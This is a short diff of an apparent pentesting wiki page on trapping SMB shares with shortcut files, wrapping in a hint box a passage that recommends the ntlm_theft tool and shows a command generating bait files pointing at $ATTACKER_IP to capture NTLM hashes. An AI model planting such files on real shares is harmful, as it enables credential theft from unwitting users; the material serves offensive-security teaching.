@@ -79,11 +79,13 @@ SMB shares can be trapped with shortcut files that will automatically be handled
 Shortcut file names can be preprended with a `@` symbol to put them on top of the share, to make sure the file explorer has to parse it.
 {% endhint %}
 
+{% hint style="success" %}
 The [ntlm\_theft](https://github.com/Greenwolf/ntlm_theft) \(Python\) tool can be used to generate multiple file types at once \(lnk, scf, url, docx, xslx, htm, xml, pdf, ...\).
 
 ```bash
 ntlm_theft.py --generate all --server $ATTACKER_IP --filename "@FILENAME"
 ```
+{% endhint %}
 
 {% tabs %}
 {% tab title=".lnk" %}
